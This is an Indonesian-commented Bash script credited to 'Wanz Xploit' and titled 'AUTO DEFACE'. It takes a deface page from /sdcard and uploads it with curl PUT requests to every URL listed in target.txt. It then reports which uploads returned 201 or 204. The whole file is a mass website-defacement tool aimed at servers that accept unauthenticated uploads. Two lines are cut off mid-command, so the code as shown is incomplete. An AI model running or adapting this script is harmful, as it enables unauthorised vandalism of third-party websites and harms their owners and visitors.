#!/bin/bash
#Gunakan dengan bijak!
#Coded by Wanz Xploit
#recode boleh tapi jangan ubah nama pembuat kode nya!!
#kalo record jangan asal ciplak
#ubah tampilan nya juga biar ga asal copy paste

# Cek apakah figlet sudah terinstall, jika belum maka install figlet
if ! command -v figlet &> /dev/null; then
  echo "Figlet belum terinstall, menginstall figlet ..."
  echo ""
  apt update
  apt install figlet -y
  echo ""
fi
# Nama figlet
echo ""
echo ""
figlet -f slant "AUTO DEFACE"
echo "Code By Wanz Xploit || Open source"
echo ""
# Masukkan nama file yang akan diupload
read -p "Masukkan nama Sc deface kalian: " filename
echo ""
# Cek apakah file yang dimaksud ada atau tidak
if [ -f "/sdcard/$filename" ]; then
  echo "Deface menggunakan file $filename ..."
  echo ""
  echo "============================"
  # Baca file target.txt dan upload file dengan curl
  while IFS= read -r url; do
    echo "Deface to: $url"
    result=$(curl -s -T "/sdcard/$filename" "$url" --max-time 10 --wr>
    if [ $result -eq 201 ] || [ $result -eq 204 ] || [ $result -eq 20>
      echo -e "\e[32mDeface berhasil ke $url\e[0m"
      echo ""
    else
      echo -e "\e[31mDeface gagal ke $url\e[0m"
      echo ""
    fi
  done < target.txt
else
  echo "File tidak ditemukan!"
fi